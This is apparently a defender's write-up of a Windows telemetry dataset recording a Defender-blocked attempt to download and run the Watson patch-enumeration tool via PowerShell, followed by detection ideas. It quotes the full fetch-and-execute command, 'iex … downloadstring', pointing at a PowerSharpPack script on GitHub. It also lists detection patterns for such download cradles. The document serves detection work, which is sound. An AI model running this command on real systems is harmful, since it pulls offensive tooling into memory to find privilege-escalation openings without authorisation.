# T1082-21: System Information Discovery — WinPwn - PowerSharpPack - Watson searching for missing windows patches

## Technique Context

T1082 (System Information Discovery) involves adversaries gathering information about the target system to understand the environment and identify potential attack paths. The Watson tool specifically searches for missing Windows security patches, making it valuable for privilege escalation and exploit development. This technique is commonly used in post-exploitation phases to identify vulnerable systems that can be targeted with specific exploits. The detection community focuses on identifying automated system enumeration tools, unusual process chains, and attempts to access patch information through various Windows APIs or utilities.

## What This Dataset Contains

This dataset captures a failed attempt to execute the Watson vulnerability scanner from the PowerSharpPack toolkit. The attack chain begins with PowerShell execution and attempts to download and execute Watson via Invoke-Expression. Key telemetry includes:

Security 4688 events show the process creation chain: `powershell.exe` → `whoami.exe` (PID 34280) and another `powershell.exe` child (PID 19444) with the full command line: `"powershell.exe" & {$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'...`

Sysmon EID 1 events capture the same process creations, with the Watson download attempt visible in the CommandLine field of PID 19444: `iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1')`

PowerShell EID 4100 shows Windows Defender blocking the technique: "This script contains malicious content and has been blocked by your antivirus software" with error ID `ScriptContainedMaliciousContent`.

Sysmon EID 22 DNS query for `raw.githubusercontent.com` resolving to GitHub's CDN IP addresses (185.199.108-111.133), indicating the download attempt succeeded at the network level.

Multiple Sysmon EID 7 events show .NET runtime and PowerShell automation DLLs loading, plus Windows Defender integration (MpOAV.dll, MpClient.dll) that ultimately blocked execution.

## What This Dataset Does Not Contain

The dataset lacks the actual Watson execution because Windows Defender successfully blocked the malicious PowerShell script before it could run. Therefore, there are no events showing:
- System information enumeration activities that Watson would typically perform
- Registry queries for patch information
- WMI queries for system configuration
- File system enumeration
- The actual vulnerability assessment output

The network connection to GitHub succeeded (evidenced by DNS resolution), but Sysmon network connection events are absent, likely filtered by the sysmon-modular configuration. No file creation events show the downloaded script being written to disk, as Defender blocked it in-memory during the `iex` execution.

## Assessment

This dataset provides excellent telemetry for detecting attempted system information discovery via Watson, particularly the initial stages of tool deployment. The combination of Security 4688 command-line logging and PowerShell script block logging (EID 4104) clearly captures the attack methodology. The Defender blocking provides a realistic scenario where automated tools are prevented from executing, but the attempt itself generates valuable detection data. The DNS resolution event and process creation chain are particularly strong indicators of this specific attack pattern.

## Detection Opportunities Present in This Data

1. **PowerShell download and execution patterns** - Detect `iex(new-object net.webclient).downloadstring` combined with GitHub raw content URLs in PowerShell command lines or script blocks
2. **Watson-specific indicators** - Alert on references to "Invoke-SharpWatson", "Invoke-watson", or PowerSharpPack repository URLs in process command lines
3. **Suspicious PowerShell process chains** - Monitor for PowerShell spawning child PowerShell processes with encoded or obfuscated commands
4. **GitHub CDN DNS queries from system processes** - Flag DNS queries to raw.githubusercontent.com from system-level PowerShell processes
5. **AMSI/Defender block events** - Correlate PowerShell EID 4100 "ScriptContainedMaliciousContent" errors with preceding process creation and network activity
6. **S3cur3Th1sSh1t repository references** - Detect the distinctive repository variable assignment pattern: `$S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'`
7. **System enumeration tool deployment** - Alert on attempts to download and execute known vulnerability scanners or system discovery tools via PowerShell
